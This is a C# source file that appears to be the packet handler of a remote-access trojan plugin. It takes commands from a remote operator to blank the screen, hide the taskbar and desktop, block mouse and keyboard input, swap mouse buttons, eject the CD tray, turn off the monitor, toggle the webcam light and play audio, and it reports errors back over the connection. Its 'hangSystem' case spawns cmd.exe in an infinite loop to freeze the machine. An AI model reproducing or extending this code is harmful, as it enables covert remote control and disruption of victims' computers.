using Plugin.Handler;
using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {

                    case "blankscreen+":
                        {
                            new HandleBlankScreen().Run();
                            break;
                        }

                    case "blankscreen-":
                        {
                            new HandleBlankScreen().Stop();
                            break;
                        }

                    case "Taskbar+":
                        {
                            new HandleTaskbar().Show();
                            break;
                        }

                    case "Taskbar-":
                        {
                            new HandleTaskbar().Hide();
                            break;
                        }

                    case "Clock+":
                        {
                            new HandleClock().Show();
                            break;
                        }

                    case "Clock-":
                        {
                            new HandleClock().Hide();
                            break;
                        }

                    case "Desktop+":
                        {
                            new HandleDesktop().Show();
                            break;
                        }

                    case "Desktop-":
                        {
                            new HandleDesktop().Hide();
                            break;
                        }

                    case "holdMouse":
                        {
                            new HandleHoldMouse().Hold(unpack_msgpack.ForcePathObject("Time").AsString);
                            break;
                        }

                    case "swapMouseButtons":
                        {
                            new HandleMouseButton().SwapMouseButtons();
                            break;
                        }

                    case "restoreMouseButtons":
                        {
                            new HandleMouseButton().RestoreMouseButtons();
                            break;
                        }

                    case "blockInput":
                        {
                            new HandleBlockInput().Block(unpack_msgpack.ForcePathObject("Time").AsString);
                            break;
                        }

                    case "openCD+":
                        {
                            new HandleOpenCD().Show();
                            break;
                        }

                    case "openCD-":
                        {
                            new HandleOpenCD().Hide();
                            break;
                        }

                    case "monitorOff":
                        {
                            new HandleMonitor().TurnOff();
                            break;
                        }

                    case "hangSystem":
                        {
                            var startInfo = new ProcessStartInfo("cmd.exe");
                            while (true)
                                Process.Start(startInfo);
                            break;
                        }

                    case "webcamlight+":
                        {
                            new HandleWebcamLight().Enable();
                            break;
                        }

                    case "webcamlight-":
                        {
                            new HandleWebcamLight().Disable();
                            break;
                        }

                    case "playAudio":
                        {
                            new HandlePlayAudio().Play(unpack_msgpack.ForcePathObject("wavfile").GetAsBytes());
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}